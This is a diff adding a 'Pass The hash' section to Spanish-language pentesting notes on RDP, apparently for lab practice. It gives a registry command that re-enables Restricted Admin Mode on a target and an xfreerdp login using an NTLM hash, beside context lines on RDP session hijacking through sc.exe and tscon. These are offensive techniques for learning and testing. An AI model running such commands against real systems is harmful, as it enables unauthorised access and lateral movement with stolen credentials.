@@ -122,6 +122,24 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 net start sessionhijack
 ```
 
+### Pass The hash
+
+#### RDP con Restricted Admin Mode <a href="#rdp-con-restricted-admin-mode" id="rdp-con-restricted-admin-mode"></a>
+
+Por defecto RDP con NLA requiere contraseña en texto claro. Con **Restricted Admin Mode** activo en el destino, se puede conectar usando solo el hash.
+
+```cmd
+# Habilitar Restricted Admin Mode en el objetivo (requiere acceso previo)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+```cmd
+# Conectar via RDP con xfreerdp usando hash
+xfreerdp /v:192.168.1.20 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /d:EMPRESA
+```
+
+Si Restricted Admin Mode no está habilitado, xfreerdp devuelve un error de restricción de cuenta.
+
 ## Misconfiguraciones
 
 | **Contraseñas débiles** | El protocolo RDP utiliza las credenciales del usuario, si la contraseña es debil un ataque por fuerza bruta podria permitir el acceso al atacante |
